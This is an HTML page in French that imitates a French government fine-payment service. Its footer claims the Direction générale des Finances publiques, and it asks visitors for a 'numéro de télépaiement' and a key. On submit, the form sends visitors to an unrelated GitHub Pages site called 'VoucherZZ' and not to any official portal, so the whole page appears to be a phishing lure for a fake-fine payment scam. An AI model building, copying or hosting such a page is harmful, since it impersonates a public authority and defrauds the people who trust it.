<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service de paiement des amendes</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .header {
            width: 100%;
            height: 60vh; /* Increased height for the header */
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
        }
        .header img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            width: auto; /* Ensure the image scales correctly */
            height: auto; /* Ensure the image scales correctly */
        }
        .content {
            padding: 20px;
        }
        .form-container {
            max-width: 500px;
            margin: 0 auto;
            text-align: left;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
        }
        .button-zone button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 12px 35px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 90%;
        }
        .footer-copyright {
            margin-top: 20px;
            text-align: center;
        }
        @media (max-width: 768px) {
            .header {
                height: auto;
            }
            .header img {
                max-height: 40vh; /* Increased height for smaller screens */
            }
            .button-zone button {
                padding: 12px 30px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a>
    </div>
    <div class="content">
        <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" border="0" style="max-width: 100%; height: auto;" /></a></center>
       <div class="form-container">
            
        <center><h3>Saisie du numéro de télépaiement</h3>
         
       
            <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
                
              <div class="input-group">
                    <label for="numeroTelepaiement">Numéro de télépaiement :</label>
                  
                    <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
                </div>
                <div class="input-group">
                    <label for="cle">Clé :</label>
                    <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
                </div>
                <center><div class="button-zone">
                    <button type="submit">Payer</button>
                </div>
            </form>
        </div>
    </div>
    <div class="footer-copyright">
        <p>© Direction générale des Finances publiques - <a id="mention-legales" class="xt" href="/tai/mention-legales">Mentions légales</a></p>
    </div>
</body>
</html>
